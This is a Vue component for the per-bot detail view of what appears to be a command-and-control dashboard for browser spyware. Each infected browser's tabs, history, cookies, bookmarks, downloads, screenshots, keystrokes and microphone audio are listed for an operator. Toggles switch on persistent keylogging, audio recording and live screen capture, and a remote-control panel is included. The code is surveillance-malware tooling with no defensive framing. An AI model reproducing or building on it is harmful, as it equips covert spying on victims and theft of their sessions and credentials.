<script setup lang="ts">
import { computed, onBeforeUnmount, onMounted, ref, watch } from 'vue'
import { useRouter } from 'vue-router'
import { bots as botsApi } from '@/api/endpoints'
import { useBotsStore } from '@/stores/bots'
import type { BotSummary } from '@/types/api'
import Btn from '@/components/ui/Btn.vue'
import StatusDot from '@/components/ui/StatusDot.vue'
import { timeAgo, formatDate } from '@/composables/useTime'
import { useClipboard } from '@/composables/useClipboard'

import Tabs from '@/components/data/Tabs.vue'
import History from '@/components/data/History.vue'
import Cookies from '@/components/data/Cookies.vue'
import Bookmarks from '@/components/data/Bookmarks.vue'
import Downloads from '@/components/data/Downloads.vue'
import Screenshots from '@/components/data/Screenshots.vue'
import Keyboard from '@/components/data/Keyboard.vue'
import Audio from '@/components/data/Audio.vue'
import Activity from '@/components/data/Activity.vue'
import Remote from '@/components/data/Remote.vue'
import Config from '@/components/data/Config.vue'

const props = defineProps<{ id: string }>()
const router = useRouter()
const store = useBotsStore()
const { copy, copied } = useClipboard()

type TabKey =
  | 'tabs' | 'history' | 'cookies' | 'bookmarks' | 'downloads'
  | 'screenshots' | 'keyboard' | 'audio'
  | 'activity' | 'remote' | 'config'

const tabs: { key: TabKey; label: string }[] = [
  { key: 'tabs', label: 'Tabs' },
  { key: 'history', label: 'History' },
  { key: 'cookies', label: 'Cookies' },
  { key: 'bookmarks', label: 'Bookmarks' },
  { key: 'downloads', label: 'Downloads' },
  { key: 'screenshots', label: 'Screenshots' },
  { key: 'keyboard', label: 'Keyboard' },
  { key: 'audio', label: 'Audio' },
  { key: 'activity', label: 'Activity' },
  { key: 'remote', label: 'Remote control' },
  { key: 'config', label: 'Config' },
]

const active = ref<TabKey>('tabs')
const bot = ref<BotSummary | null>(null)
const refreshTimer = ref<ReturnType<typeof setTimeout> | null>(null)

async function refresh(): Promise<void> {
  await store.fetch()
  bot.value = store.list.find((b: BotSummary) => b.id === props.id) ?? null
}

const imageURL = computed(() => botsApi.imageURL(props.id))

const statusIndicators = computed(() => {
  const sc = bot.value?.switch_config ?? {}
  return [
    { key: 'SYNC', icon: '⟳', label: 'Tabs', help: 'Real-time tab sync', active: Boolean(sc.SYNC) },
    { key: 'SYNC_HUGE', icon: '⇄', label: 'Data sync', help: 'History/cookies/bookmarks sync', active: Boolean(sc.SYNC_HUGE) },
    { key: 'REALTIME_IMG', icon: '📷', label: 'Screen', help: 'Live screenshot capture', active: Boolean(sc.REALTIME_IMG) },
    { key: 'NOTIFICATION', icon: '🔔', label: 'Alerts', help: 'Domain visit notifications', active: Boolean(sc.NOTIFICATION) },
    { key: 'PERSISTENT_RECORDING', icon: '🎙', label: 'Mic', help: 'Persistent audio recording', active: Boolean(sc.PERSISTENT_RECORDING) },
    { key: 'PERSISTENT_KEYBOARD', icon: '⌨', label: 'Keys', help: 'Persistent keystroke logging', active: Boolean(sc.PERSISTENT_KEYBOARD) },
  ]
})

watch(() => props.id, refresh, { immediate: true })

onMounted(() => {
  // light-touch background refresh
  const tick = async (): Promise<void> => {
    await refresh()
    refreshTimer.value = setTimeout(() => void tick(), 5000)
  }
  void tick()
})
onBeforeUnmount(() => {
  if (refreshTimer.value) clearTimeout(refreshTimer.value)
})

function back(): void {
  void router.push({ name: 'dashboard' })
}
</script>

<template>
  <div v-if="bot" class="px-6 pt-5 pb-12 max-w-[1400px] mx-auto">
    <!-- breadcrumb + title row -->
    <div class="flex items-center gap-2 mb-4 text-[11px] text-fg-faint">
      <button class="hover:text-fg-base" @click="back">← Bots</button>
      <span>/</span>
      <span class="mono truncate">{{ bot.id }}</span>
    </div>

    <!-- summary header -->
    <div class="surface-raised p-5 mb-6">
      <div class="flex gap-5">
        <div
          class="w-[260px] h-[150px] rounded-md overflow-hidden border border-border-subtle bg-bg-base shrink-0"
        >
          <img
            v-if="bot.current_tab_image"
            :src="imageURL"
            class="w-full h-full object-cover"
            alt=""
          />
          <div v-else class="w-full h-full grid place-items-center text-fg-faint text-[11px] mono">
            no thumbnail
          </div>
        </div>

        <div class="flex-1 min-w-0">
          <div class="flex items-center gap-3">
            <h1 class="text-[18px] font-semibold tracking-tight truncate">
              {{ bot.name || 'Untitled' }}
            </h1>
            <StatusDot :online="bot.is_online" />
          </div>

          <a
            v-if="bot.current_tab?.url"
            :href="bot.current_tab.url"
            target="_blank"
            rel="noopener"
            class="text-[12px] text-accent hover:underline mt-1 block truncate"
            :title="bot.current_tab.url"
          >
            {{ bot.current_tab.title || bot.current_tab.url }}
          </a>
          <p v-else class="text-[12px] text-fg-faint mt-1">No active tab.</p>

          <div class="flex flex-wrap gap-1.5 mt-3">
            <span
              v-for="s in statusIndicators"
              :key="s.key"
              class="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[10px] font-medium border"
              :class="s.active
                ? 'bg-success/10 text-success border-success/25'
                : 'bg-bg-base text-fg-faint border-border-subtle'"
              :title="s.help"
            >
              <span class="text-[11px]">{{ s.icon }}</span>
              {{ s.label }}
            </span>
          </div>

          <dl class="grid grid-cols-2 gap-x-6 gap-y-1.5 text-[11px] mt-4">
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">Bot UUID</dt>
              <dd class="mono mt-0.5 truncate">
                <button class="hover:text-accent" @click="copy(bot.id, 'id')">
                  {{ bot.id }} <span v-if="copied === 'id'" class="text-success ml-1">✓</span>
                </button>
              </dd>
            </div>
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">Browser ID</dt>
              <dd class="mono mt-0.5 truncate">
                <button class="hover:text-accent" @click="copy(bot.browser_id, 'br')">
                  {{ bot.browser_id }} <span v-if="copied === 'br'" class="text-success ml-1">✓</span>
                </button>
              </dd>
            </div>
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">Last active</dt>
              <dd class="mono mt-0.5">{{ timeAgo(bot.last_active_at ?? bot.last_online) }}</dd>
            </div>
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">First seen</dt>
              <dd class="mono mt-0.5">{{ formatDate(bot.createdAt) }}</dd>
            </div>
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">Tabs / history</dt>
              <dd class="mono mt-0.5">{{ bot.tabs }} / {{ bot.history }}</dd>
            </div>
            <div>
              <dt class="text-fg-faint uppercase tracking-wider">State</dt>
              <dd class="mono mt-0.5">{{ bot.state || '—' }}</dd>
            </div>
          </dl>
        </div>
      </div>
    </div>

    <!-- tab strip -->
    <div class="flex items-center gap-1 border-b border-border-subtle mb-5 overflow-x-auto">
      <button
        v-for="t in tabs"
        :key="t.key"
        class="h-9 px-3 text-[12px] font-medium border-b-2 transition-colors whitespace-nowrap"
        :class="
          active === t.key
            ? 'border-accent text-fg-base'
            : 'border-transparent text-fg-muted hover:text-fg-base'
        "
        @click="active = t.key"
      >
        {{ t.label }}
      </button>
      <Btn class="ml-auto" size="sm" variant="ghost" @click="refresh">Refresh</Btn>
    </div>

    <!-- panels -->
    <Tabs v-if="active === 'tabs'" :bot-id="bot.id" />
    <History v-else-if="active === 'history'" :bot-id="bot.id" />
    <Cookies v-else-if="active === 'cookies'" :bot-id="bot.id" />
    <Bookmarks v-else-if="active === 'bookmarks'" :bot-id="bot.id" />
    <Downloads v-else-if="active === 'downloads'" :bot-id="bot.id" />
    <Screenshots v-else-if="active === 'screenshots'" :bot-id="bot.id" />
    <Keyboard v-else-if="active === 'keyboard'" :bot-id="bot.id" />
    <Audio v-else-if="active === 'audio'" :bot-id="bot.id" />
    <Activity v-else-if="active === 'activity'" :bot-id="bot.id" />
    <Remote
      v-else-if="active === 'remote'"
      :bot-id="bot.id"
      :user-agent="bot.user_agent"
    />
    <Config
      v-else-if="active === 'config'"
      :bot="bot"
      @saved="refresh"
    />
  </div>

  <div v-else class="grid place-items-center h-[60vh] text-fg-faint text-[12px]">
    Loading bot…
  </div>
</template>
